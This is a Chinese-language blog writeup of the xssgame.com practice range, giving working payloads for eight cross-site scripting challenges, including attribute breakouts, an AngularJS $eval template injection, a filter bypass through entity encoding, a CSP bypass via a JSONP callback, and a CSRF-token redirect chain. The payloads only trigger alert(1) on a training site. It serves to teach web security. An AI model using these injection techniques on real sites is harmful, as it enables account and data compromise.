---
title: "xss game writeup"
description: "靶场地址"
publishDate: "2019-04-06T02:00:00.000Z"
updatedDate: "2021-11-04T08:01:49.200Z"
categories: ["web安全"]
tags: ["security"]
sourceSite: "shequ123.github.io"
legacyPath: "2019/04/06/xss-game/index.html"
legacyUrl: "http://j1nse.cool/2019/04/06/xss-game/"
---
<p><a href="http://www.xssgame.com" target="_blank" rel="noopener">靶场地址</a><br></p>
<h2 id="1">1</h2><p><a href="http://www.xssgame.com/f/m4KKGHi2rVUN/?query=%3Cscript%3Ealert(1)%3C/script%3E" target="_blank" rel="noopener">http://www.xssgame.com/f/m4KKGHi2rVUN/?query=%3Cscript%3Ealert(1)%3C/script%3E</a><br><code>&lt;b&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/b&gt;</code></p>
<h2 id="2">2</h2><p>输入会插入到<code>onload="startTimer('input');" /&gt;</code>这里</p>
<p>用<code>');alert('1</code></p>
<p><code>&lt;img id="loading" src="/static/img/loading.gif" style="width: 50%; display: none;" onload="startTimer('');alert('1');"&gt;</code></p>
<h2 id="3">3</h2><p><code>1'onerror=alert(1);'</code></p>
<p>结果:<br><code>&lt;img src="/static/img/cat1" onerror="alert(1);'.jpg'"&gt;</code></p>
<h2 id="4">4</h2><p><code>http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert(1)</code></p>
<p>next的值会加到next前面作为跳转链接<code>http://www.xssgame.com/f/__58a1wgqGgI/abc?next=welcome</code><br>然后跳转链接里next的值会输出到页面</p>
<h2 id="5">5</h2><p>看了一下js，大概意思就是url里的查询部分的值会插到对应input标签里的值。在搜索框里有<code>ng-non-bindable</code>属性，没法触发解析漏洞，所以就用input标签的值来触发</p>
<p><code>http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{$eval(%27alert(1)%27)}}</code></p>
<p>这里的alert()已经被替换成<code>window.alert</code>了</p>
<h2 id="6">6</h2><p>url里过滤了<code>{</code><br>所以用html实体编码再url编码一下<code>{</code><br>payload:`%26%23123%3B%26%23123%3B%0A$eval(%27alert(1)%27);}}</p>
<h2 id="7">7</h2><p>绕过CSP，用jsonp的callback名字来绕<br><code>&lt;script src="jsonp?callback=alert(1)"&gt;&lt;/script&gt;</code></p>
<h2 id="8">8</h2><p>先用<code>?set</code>设置csrf_token，然后再redirect到transfer,用<code>?transfer</code>来输出payload，带上设置的csrf_token<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=123&amp;redirect=transfer?amount=%3Cscript%3Ealert(1)%3C%2Fscript%3E%26csrf_token=123</code><br>注意redirect的<code>&amp;</code>要编码一下，否则会被解析成set的参数</p>
<p><strong>Congratulations, you have solved all the challenges!</strong></p>